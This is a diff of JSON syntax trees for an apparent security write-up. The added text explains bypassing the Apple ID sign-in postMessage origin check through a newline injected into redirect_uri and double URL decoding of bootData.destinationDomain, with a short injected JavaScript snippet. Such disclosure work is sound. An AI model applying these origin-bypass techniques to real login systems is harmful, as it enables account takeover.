>                           "type": "text",
>                           "value": "https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages",
>                           "position": {
>                             "start": {
>                               "line": 1012,
>                               "column": 7,
>                               "offset": 49384
>                             },
>                             "end": {
>                               "line": 1012,
>                               "column": 81,
>                               "offset": 49458
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1012,
>                           "column": 7,
>                           "offset": 49384
>                         },
>                         "end": {
>                           "line": 1012,
>                           "column": 81,
>                           "offset": 49458
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1012,
>                       "column": 7,
>                       "offset": 49384
>                     },
>                     "end": {
>                       "line": 1012,
>                       "column": 81,
>                       "offset": 49458
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9123,9125c17237,17239
<                   "line": 510,
<                   "column": 3,
<                   "offset": 24044
---
>                   "line": 1012,
>                   "column": 1,
>                   "offset": 49378
9128,9130c17242,17244
<                   "line": 510,
<                   "column": 36,
<                   "offset": 24077
---
>                   "line": 1012,
>                   "column": 81,
>                   "offset": 49458
9134,9145d17247
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 510,
<               "column": 3,
<               "offset": 24044
<             },
<             "end": {
<               "line": 510,
<               "column": 36,
<               "offset": 24077
9147,9152d17248
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9154,9155c17250,17372
<               "type": "text",
<               "value": "You: Cancel. Quit. ^C",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "inlineCode",
>                   "value": "targetOrigin",
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 1,
>                       "offset": 49464
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 15,
>                       "offset": 49478
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is ",
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 15,
>                       "offset": 49478
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 19,
>                       "offset": 49482
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "not",
>                       "position": {
>                         "start": {
>                           "line": 1015,
>                           "column": 20,
>                           "offset": 49483
>                         },
>                         "end": {
>                           "line": 1015,
>                           "column": 23,
>                           "offset": 49486
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 19,
>                       "offset": 49482
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 24,
>                       "offset": 49487
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " an origin!! ",
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 24,
>                       "offset": 49487
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 37,
>                       "offset": 49500
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "targetOrigin",
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 37,
>                       "offset": 49500
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 51,
>                       "offset": 49514
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is technically a URL, from which an origin is extracted. For us, this is especially useful.",
>                   "position": {
>                     "start": {
>                       "line": 1015,
>                       "column": 51,
>                       "offset": 49514
>                     },
>                     "end": {
>                       "line": 1015,
>                       "column": 143,
>                       "offset": 49606
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9158,9160c17375,17377
<                   "line": 512,
<                   "column": 3,
<                   "offset": 24084
---
>                   "line": 1015,
>                   "column": 1,
>                   "offset": 49464
9163,9165c17380,17382
<                   "line": 512,
<                   "column": 24,
<                   "offset": 24105
---
>                   "line": 1015,
>                   "column": 143,
>                   "offset": 49606
9169,9180d17385
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 512,
<               "column": 3,
<               "offset": 24084
<             },
<             "end": {
<               "line": 512,
<               "column": 24,
<               "offset": 24105
9182,9187d17386
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9189,9190c17388,17527
<               "type": "text",
<               "value": "Euclid: Why is there a white box?",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Since the real origin is extracted from the ",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 1,
>                       "offset": 49610
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 45,
>                       "offset": 49654
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "targetOrigin",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 45,
>                       "offset": 49654
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 59,
>                       "offset": 49668
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " which we provide, after running the URL parser if we provide a value which parses to ",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 59,
>                       "offset": 49668
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 145,
>                       "offset": 49754
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "our",
>                       "position": {
>                         "start": {
>                           "line": 1017,
>                           "column": 146,
>                           "offset": 49755
>                         },
>                         "end": {
>                           "line": 1017,
>                           "column": 149,
>                           "offset": 49758
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 145,
>                       "offset": 49754
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 150,
>                       "offset": 49759
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " origin instead of ",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 150,
>                       "offset": 49759
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 169,
>                       "offset": 49778
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "www.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 169,
>                       "offset": 49778
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 185,
>                       "offset": 49794
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " then we can bypass the intended origin check.",
>                   "position": {
>                     "start": {
>                       "line": 1017,
>                       "column": 185,
>                       "offset": 49794
>                     },
>                     "end": {
>                       "line": 1017,
>                       "column": 231,
>                       "offset": 49840
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9193,9195c17530,17532
<                   "line": 514,
<                   "column": 3,
<                   "offset": 24112
---
>                   "line": 1017,
>                   "column": 1,
>                   "offset": 49610
9198,9200c17535,17537
<                   "line": 514,
<                   "column": 36,
<                   "offset": 24145
---
>                   "line": 1017,
>                   "column": 231,
>                   "offset": 49840
9204,9215d17540
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 514,
<               "column": 3,
<               "offset": 24112
<             },
<             "end": {
<               "line": 514,
<               "column": 36,
<               "offset": 24145
9217,9222d17541
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9224,9225c17543,17630
<               "type": "text",
<               "value": "You (sighing): Because even though we've\nloaded the Apple ID signin page, it hasn't loaded any content",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Given that ",
>                   "position": {
>                     "start": {
>                       "line": 1019,
>                       "column": 1,
>                       "offset": 49844
>                     },
>                     "end": {
>                       "line": 1019,
>                       "column": 12,
>                       "offset": 49855
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 1019,
>                       "column": 12,
>                       "offset": 49855
>                     },
>                     "end": {
>                       "line": 1019,
>                       "column": 29,
>                       "offset": 49872
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " appears to perform an origin parse itself, it would be impossible to do this if not for one minor bug in the way that ",
>                   "position": {
>                     "start": {
>                       "line": 1019,
>                       "column": 29,
>                       "offset": 49872
>                     },
>                     "end": {
>                       "line": 1019,
>                       "column": 148,
>                       "offset": 49991
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 1019,
>                       "column": 148,
>                       "offset": 49991
>                     },
>                     "end": {
>                       "line": 1019,
>                       "column": 162,
>                       "offset": 50005
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is passed to the page's javascript code.",
>                   "position": {
>                     "start": {
>                       "line": 1019,
>                       "column": 162,
>                       "offset": 50005
>                     },
>                     "end": {
>                       "line": 1019,
>                       "column": 203,
>                       "offset": 50046
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9228,9230c17633,17635
<                   "line": 516,
<                   "column": 3,
<                   "offset": 24152
---
>                   "line": 1019,
>                   "column": 1,
>                   "offset": 49844
9233,9235c17638,17748
<                   "line": 517,
<                   "column": 62,
<                   "offset": 24255
---
>                   "line": 1019,
>                   "column": 203,
>                   "offset": 50046
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "You see, early on in my testing I noticed that if I added ",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 1,
>                       "offset": 50050
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 59,
>                       "offset": 50108
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "%0a",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 59,
>                       "offset": 50108
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 64,
>                       "offset": 50113
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which is URL speak for 'new line' in my ",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 64,
>                       "offset": 50113
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 106,
>                       "offset": 50155
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 106,
>                       "offset": 50155
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 120,
>                       "offset": 50169
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", the page would completely break! The reason for this is that the ",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 120,
>                       "offset": 50169
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 187,
>                       "offset": 50236
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 187,
>                       "offset": 50236
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 201,
>                       "offset": 50250
>                     },
>                     "indent": []
>                   }
9237,9264c17750,17767
<                 "indent": [
<                   1
<                 ]
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 516,
<               "column": 3,
<               "offset": 24152
<             },
<             "end": {
<               "line": 517,
<               "column": 62,
<               "offset": 24255
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
<             {
<               "type": "text",
<               "value": "Euclid: Why hasn't it loaded any content?",
---
>                 {
>                   "type": "text",
>                   "value": " is passed to the Javascript code by generating Javascript code into the page, like this:",
>                   "position": {
>                     "start": {
>                       "line": 1021,
>                       "column": 201,
>                       "offset": 50250
>                     },
>                     "end": {
>                       "line": 1021,
>                       "column": 290,
>                       "offset": 50339
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9267,9269c17770,17772
<                   "line": 519,
<                   "column": 3,
<                   "offset": 24262
---
>                   "line": 1021,
>                   "column": 1,
>                   "offset": 50050
9272,9274c17775,17777
<                   "line": 519,
<                   "column": 44,
<                   "offset": 24303
---
>                   "line": 1021,
>                   "column": 290,
>                   "offset": 50339
9278,9289d17780
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 519,
<               "column": 3,
<               "offset": 24262
<             },
<             "end": {
<               "line": 519,
<               "column": 44,
<               "offset": 24303
9291,9296d17781
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9298,9299c17783,17786
<               "type": "text",
<               "value": "You: I don't know? You tell me. It's your\narticle dude",
---
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "bootData.destinationDomain = decodeURIComponent('https://www.icloud.com');  ",
9302,9304c17789,17791
<                   "line": 521,
<                   "column": 3,
<                   "offset": 24310
---
>                   "line": 1023,
>                   "column": 1,
>                   "offset": 50343
9307,9309c17794,17796
<                   "line": 522,
<                   "column": 13,
<                   "offset": 24365
---
>                   "line": 1025,
>                   "column": 4,
>                   "offset": 50439
9311a17799
>                   1,
9315,9326d17802
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 521,
<               "column": 3,
<               "offset": 24310
<             },
<             "end": {
<               "line": 522,
<               "column": 13,
<               "offset": 24365
9328,9335d17803
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
9337,9343c17805,17822
<               "type": "text",
<               "value": "Euclid (me): ok sure whatever",
<               "position": {
<                 "start": {
<                   "line": 524,
<                   "column": 3,
<                   "offset": 24372
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Note that the parameter passed to ",
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 1,
>                       "offset": 50441
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 35,
>                       "offset": 50475
>                     },
>                     "indent": []
>                   }
9345,9348c17824,17839
<                 "end": {
<                   "line": 524,
<                   "column": 32,
<                   "offset": 24401
---
>                 {
>                   "type": "inlineCode",
>                   "value": "decodeURIComponent",
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 35,
>                       "offset": 50475
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 55,
>                       "offset": 50495
>                     },
>                     "indent": []
>                   }
9350,9376d17840
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 524,
<               "column": 3,
<               "offset": 24372
<             },
<             "end": {
<               "line": 524,
<               "column": 32,
<               "offset": 24401
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "paragraph",
<           "children": [
<             {
<               "type": "linkReference",
<               "identifier": "euclid",
<               "label": "Euclid",
<               "referenceType": "shortcut",
<               "children": [
9379c17843
<                   "value": "Euclid",
---
>                   "value": ", which URL decodes the given string is ",
9382,9384c17846,17848
<                       "line": 526,
<                       "column": 4,
<                       "offset": 24409
---
>                       "line": 1026,
>                       "column": 55,
>                       "offset": 50495
9387,9389c17851,17939
<                       "line": 526,
<                       "column": 10,
<                       "offset": 24415
---
>                       "line": 1026,
>                       "column": 95,
>                       "offset": 50535
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "already",
>                       "position": {
>                         "start": {
>                           "line": 1026,
>                           "column": 96,
>                           "offset": 50536
>                         },
>                         "end": {
>                           "line": 1026,
>                           "column": 103,
>                           "offset": 50543
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 95,
>                       "offset": 50535
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 104,
>                       "offset": 50544
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " URL decoded. So when ",
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 104,
>                       "offset": 50544
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 126,
>                       "offset": 50566
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "%0A",
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 126,
>                       "offset": 50566
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 131,
>                       "offset": 50571
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is present in the URL, the following Javascript gets generated:",
>                   "position": {
>                     "start": {
>                       "line": 1026,
>                       "column": 131,
>                       "offset": 50571
>                     },
>                     "end": {
>                       "line": 1026,
>                       "column": 195,
>                       "offset": 50635
9397,9399c17947,17949
<                   "line": 526,
<                   "column": 3,
<                   "offset": 24408
---
>                   "line": 1026,
>                   "column": 1,
>                   "offset": 50441
9402,9404c17952,17954
<                   "line": 526,
<                   "column": 11,
<                   "offset": 24416
---
>                   "line": 1026,
>                   "column": 195,
>                   "offset": 50635
9410,9411c17960,17963
<               "type": "text",
<               "value": " has quit\n",
---
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "       bootData.destinationDomain = decodeURIComponent('https://\n;@www.icloud.com');  ",
9414,9416c17966,17968
<                   "line": 526,
<                   "column": 11,
<                   "offset": 24416
---
>                   "line": 1028,
>                   "column": 1,
>                   "offset": 50639
9419,9421c17971,17973
<                   "line": 527,
<                   "column": 1,
<                   "offset": 24427
---
>                   "line": 1031,
>                   "column": 4,
>                   "offset": 50746
9423a17976,17977
>                   1,
>                   1,
9429,9432c17983
<               "type": "linkReference",
<               "identifier": "leaving...",
<               "label": "Leaving...",
<               "referenceType": "shortcut",
---
>               "type": "paragraph",
9436c17987
<                   "value": "Leaving...",
---
>                   "value": "Now, Javascript strings that extend to two lines are invalid, and completely prevent the Javascript parser from continuing which breaks the page. Normally, you'd be able to get XSS with an issue like that but despite my best efforts I was unable to because I couldn't produce the ",
9439,9441c17990,17992
<                       "line": 527,
<                       "column": 2,
<                       "offset": 24428
---
>                       "line": 1033,
>                       "column": 1,
>                       "offset": 50750
9444,9446c17995,18031
<                       "line": 527,
<                       "column": 12,
<                       "offset": 24438
---
>                       "line": 1033,
>                       "column": 281,
>                       "offset": 51030
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "'",
>                   "position": {
>                     "start": {
>                       "line": 1033,
>                       "column": 281,
>                       "offset": 51030
>                     },
>                     "end": {
>                       "line": 1033,
>                       "column": 284,
>                       "offset": 51033
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " that would be needed to escape the string.",
>                   "position": {
>                     "start": {
>                       "line": 1033,
>                       "column": 284,
>                       "offset": 51033
>                     },
>                     "end": {
>                       "line": 1033,
>                       "column": 327,
>                       "offset": 51076
9454c18039
<                   "line": 527,
---
>                   "line": 1033,
9456c18041
<                   "offset": 24427
---
>                   "offset": 50750
9459,9461c18044,18046
<                   "line": 527,
<                   "column": 13,
<                   "offset": 24439
---
>                   "line": 1033,
>                   "column": 327,
>                   "offset": 51076
9465,9592d18049
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 526,
<               "column": 3,
<               "offset": 24408
<             },
<             "end": {
<               "line": 527,
<               "column": 13,
<               "offset": 24439
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 505,
<           "column": 1,
<           "offset": 23944
<         },
<         "end": {
<           "line": 527,
<           "column": 13,
<           "offset": 24439
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "You're right. The box is still white because it hasn't loaded any content. Why?\nLikely as a security measure, the login dialog expects initialization.",
<           "position": {
<             "start": {
<               "line": 529,
<               "column": 1,
<               "offset": 24443
<             },
<             "end": {
<               "line": 530,
<               "column": 71,
<               "offset": 24594
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 529,
<           "column": 1,
<           "offset": 24443
<         },
<         "end": {
<           "line": 530,
<           "column": 71,
<           "offset": 24594
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I guessed early and correctly that the dialog probably needs ",
<           "position": {
<             "start": {
<               "line": 532,
<               "column": 1,
<               "offset": 24598
<             },
<             "end": {
<               "line": 532,
<               "column": 62,
<               "offset": 24659
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 532,
<               "column": 62,
<               "offset": 24659
<             },
<             "end": {
<               "line": 532,
<               "column": 75,
<               "offset": 24672
9594,9869d18050
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\ninitialization, especially considering the designation of the auth flow as\n",
<           "position": {
<             "start": {
<               "line": 532,
<               "column": 75,
<               "offset": 24672
<             },
<             "end": {
<               "line": 534,
<               "column": 1,
<               "offset": 24750
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "web_message",
<           "position": {
<             "start": {
<               "line": 534,
<               "column": 1,
<               "offset": 24750
<             },
<             "end": {
<               "line": 534,
<               "column": 14,
<               "offset": 24763
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 534,
<               "column": 14,
<               "offset": 24763
<             },
<             "end": {
<               "line": 534,
<               "column": 15,
<               "offset": 24764
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 532,
<           "column": 1,
<           "offset": 24598
<         },
<         "end": {
<           "line": 534,
<           "column": 15,
<           "offset": 24764
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I spent a lot of time trying to reverse engineer the ",
<           "position": {
<             "start": {
<               "line": 536,
<               "column": 1,
<               "offset": 24768
<             },
<             "end": {
<               "line": 536,
<               "column": 54,
<               "offset": 24821
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 536,
<               "column": 54,
<               "offset": 24821
<             },
<             "end": {
<               "line": 536,
<               "column": 71,
<               "offset": 24838
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "  code,\nwhich is all highly compressed and minified.",
<           "position": {
<             "start": {
<               "line": 536,
<               "column": 71,
<               "offset": 24838
<             },
<             "end": {
<               "line": 537,
<               "column": 45,
<               "offset": 24891
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 536,
<           "column": 1,
<           "offset": 24768
<         },
<         "end": {
<           "line": 537,
<           "column": 45,
<           "offset": 24891
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A key observation that led me through the 47,128 lines of code in ",
<           "position": {
<             "start": {
<               "line": 539,
<               "column": 1,
<               "offset": 24895
<             },
<             "end": {
<               "line": 539,
<               "column": 67,
<               "offset": 24961
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "app.js",
<           "position": {
<             "start": {
<               "line": 539,
<               "column": 67,
<               "offset": 24961
<             },
<             "end": {
<               "line": 539,
<               "column": 75,
<               "offset": 24969
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " which\npower the Apple ID signin process was that because my 'client' that was\nembedding the Apple ID system was 'misconfigured' (i.e. fucking broken) Apple ID\nsent a message to a log system every time telling it something that went wrong.",
<           "position": {
<             "start": {
<               "line": 539,
<               "column": 75,
<               "offset": 24969
<             },
<             "end": {
<               "line": 542,
<               "column": 80,
<               "offset": 25211
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 539,
<           "column": 1,
<           "offset": 24895
<         },
<         "end": {
<           "line": 542,
<           "column": 80,
<           "offset": 25211
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": "json",
<       "meta": null,
<       "value": "{\"type\":\"ERROR\",\"title\":\"PMRPErrorMessageSequence\",\"message\":\"APPLE ID : PMRPC Message Sequence log fail at AuthWidget.\",\"iframeId\":\"601683d3-4d35-4edf-a33e-6d3266709de3\",\"details\":\"{\\\"m\\\":\\\"a:28632989 b:DEA2CA08 c:req h:rPR e:wSR:SR|a:28633252 b:196F05FD c:req h:rPR e:wSR:SR|a:28633500 b:DEA2CA08 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28633598 b:B74DD348 c:req h:rPR e:wSR:SR|a:28633765 b:196F05FD c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634110 b:BE7671A8 c:req h:rPR e:wSR:SR|a:28634110 b:B74DD348 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634621 b:BE7671A8 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28635123 b:E6F267A9 c:req h:rPR e:wSR:SR|a:28635130 b:25A38CEC c:req h:r e:wSR:SR|a:28635635 b:E6F267A9 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28636142 b:25A38CEC c:rRE f:Application error. Destination unavailable. 1000 h:r e:f2:rRE\\\",\\\"pageVisibilityState\\\":\\\"visible\\\"}\"}",
<       "position": {
<         "start": {
<           "line": 544,
<           "column": 1,
<           "offset": 25215
<         },
<         "end": {
<           "line": 546,
<           "column": 4,
<           "offset": 26273
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "As you can probably tell, this mesage is completely useless for telling us what\nexactly we need to change to make our client work, but we can leverage a\ntechique I used for my ",
<           "position": {
<             "start": {
<               "line": 548,
<               "column": 1,
<               "offset": 26277
<             },
<             "end": {
<               "line": 550,
<               "column": 24,
<               "offset": 26455
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "5",
<           "label": "5",
<           "referenceType": "full",
<           "children": [
9871,9872c18052,18191
<               "type": "text",
<               "value": "Steam Remote Code Execution",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "It seems at some point in the past, the ",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 1,
>                       "offset": 51080
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 41,
>                       "offset": 51120
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 41,
>                       "offset": 51120
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 55,
>                       "offset": 51134
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " was entering this part of the code URL encoded. But it is no longer, and we can use this to our advantage. This fact means that ",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 55,
>                       "offset": 51134
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 184,
>                       "offset": 51263
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "bootData.destinationDomain",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 184,
>                       "offset": 51263
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 212,
>                       "offset": 51291
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which specifies the valid embedding domain actually gets ",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 212,
>                       "offset": 51291
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 271,
>                       "offset": 51350
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "doubly",
>                       "position": {
>                         "start": {
>                           "line": 1035,
>                           "column": 272,
>                           "offset": 51351
>                         },
>                         "end": {
>                           "line": 1035,
>                           "column": 278,
>                           "offset": 51357
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 271,
>                       "offset": 51350
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 279,
>                       "offset": 51358
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " URL decoded.",
>                   "position": {
>                     "start": {
>                       "line": 1035,
>                       "column": 279,
>                       "offset": 51358
>                     },
>                     "end": {
>                       "line": 1035,
>                       "column": 292,
>                       "offset": 51371
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
9875,9877c18194,18196
<                   "line": 550,
<                   "column": 25,
<                   "offset": 26456
---
>                   "line": 1035,
>                   "column": 1,
>                   "offset": 51080
9880,9882c18199,18201
<                   "line": 550,
<                   "column": 52,
<                   "offset": 26483
---
>                   "line": 1035,
>                   "column": 292,
>                   "offset": 51371
9886,10792d18204
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 550,
<               "column": 24,
<               "offset": 26455
<             },
<             "end": {
